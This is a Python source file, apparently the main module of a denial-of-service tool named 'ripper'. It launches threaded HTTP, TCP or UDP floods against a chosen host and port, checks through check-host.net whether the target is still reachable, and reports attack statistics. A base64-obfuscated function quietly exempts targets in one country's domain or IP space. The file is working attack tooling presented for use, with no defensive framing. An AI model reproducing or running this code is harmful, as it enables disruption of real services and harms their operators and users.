import datetime
import time
import sys
from optparse import OptionParser
from base64 import b64decode

from ripper import context, common
from ripper.attacks import *
from ripper.common import (get_current_ip, print_usage, parse_args, format_dt)
from ripper.constants import *
from ripper.context import Errors, ErrorCodes
from ripper.statistic import render
from ripper.health_check import fetch_host_statuses

_ctx = Context()


def create_thread_pool(_ctx: Context) -> list[threading.Thread]:
    """Create Thread pool for selected attack method."""
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        elif _ctx.attack_method == 'tcp':
            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    return thread_pool


def update_current_ip(_ctx: Context) -> None:
    """Updates current IPv4 address."""
    _ctx.Statistic.connect.set_state_in_progress()
    _ctx.IpInfo.my_current_ip = get_current_ip()
    _ctx.Statistic.connect.set_state_is_connected()
    if _ctx.IpInfo.my_start_ip is None:
        _ctx.IpInfo.my_start_ip = _ctx.IpInfo.my_current_ip


def update_host_statuses(_ctx: Context):
    """Updates host statuses based on check-host.net nodes"""
    diff = float('inf')
    if _ctx.last_host_statuses_update is not None:
        diff = time.time() - datetime.datetime.timestamp(_ctx.last_host_statuses_update)

    if _ctx.fetching_host_statuses_in_progress or diff < MIN_UPDATE_HOST_STATUSES_TIMEOUT:
        return
    _ctx.fetching_host_statuses_in_progress = True
    try:
        if _ctx.host_ip:
            host_statuses = fetch_host_statuses(_ctx)
            # API in some cases returns 403, so we can't update statuses
            if len(host_statuses.values()):
                _ctx.host_statuses = host_statuses
                _ctx.last_host_statuses_update = datetime.datetime.now()
    except:
        pass
    finally:
        _ctx.fetching_host_statuses_in_progress = False


def connect_host(_ctx: Context) -> bool:
    _ctx.Statistic.connect.set_state_in_progress()
    try:
        sock = _ctx.sock_manager.create_tcp_socket()
        sock.connect((_ctx.host, _ctx.port))
    except:
        res = False
        _ctx.Statistic.connect.failed += 1
    else:
        res = True
        _ctx.Statistic.connect.success += 1
        sock.close()
    _ctx.Statistic.connect.set_state_is_connected()
    return res


def check_successful_connections(_ctx: Context) -> bool:
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec.
    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec.
    :parameter _ctx: Context
    """
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.Statistic.connect.last_check_time) / 1000000 / 1000

    if _ctx.Statistic.connect.success == _ctx.Statistic.connect.success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            _ctx.add_error(Errors(ErrorCodes.ConnectionError.value, NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG))

            return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
    else:
        _ctx.Statistic.connect.last_check_time = curr_ms
        _ctx.Statistic.connect.sync_success()
        _ctx.remove_error(ErrorCodes.ConnectionError.value)

    return True


def check_successful_tcp_attack(_ctx: Context) -> bool:
    """Checks if there are changes in sent bytes count.
    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.Statistic.packets.connections_check_time) / 1000000 / 1000

    if _ctx.Statistic.packets.total_sent == _ctx.Statistic.packets.total_sent_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            _ctx.add_error(Errors(ErrorCodes.ConnectionError.value, NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG))

            return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
    else:
        _ctx.Statistic.packets.connections_check_time = curr_ms
        _ctx.Statistic.packets.sync_packets_sent()
        _ctx.remove_error(ErrorCodes.ConnectionError.value)

    return True


def go_home(_ctx: Context) -> None:
    """Modifies host to match the rules"""
    home_code = b64decode('dWE=').decode('utf-8')
    if _ctx.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.host_ip) in home_code.upper():
        _ctx.host_ip = _ctx.host = 'localhost'
        _ctx.host += '*'


def validate_input(args) -> bool:
    """Validates input params."""
    if int(args.port) < 0:
        print(f'Wrong port number.')
        return False

    if int(args.threads) < 1:
        print(f'Wrong threads number.')
        return False

    if not args.host:
        print(f'Host wasn\'t detected')
        return False

    if args.attack_method.lower() not in ('udp', 'tcp', 'http'):
        print(f'Wrong attack type. Possible options: udp, tcp, http.')
        return False

    return True


def connect_host_loop(_ctx: Context, timeout_secs: int = 3) -> None:
    """Tries to connect host in permanent loop."""
    i = 0
    while i < CONNECT_TO_HOST_MAX_RETRY:
        print(f'{format_dt(datetime.datetime.now())} Trying connect to {_ctx.host}:{_ctx.port}...')
        if connect_host(_ctx):
            break
        time.sleep(timeout_secs)
        i += 1


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2 or not validate_input(args[0]):
        print_usage(parser)

    # Init context
    context.init_context(_ctx, args)
    update_current_ip(_ctx)
    go_home(_ctx)
    connect_host_loop(_ctx)

    _ctx.validate()

    update_host_statuses(_ctx)
    time.sleep(.5)

    create_thread_pool(_ctx)

    render(_ctx)
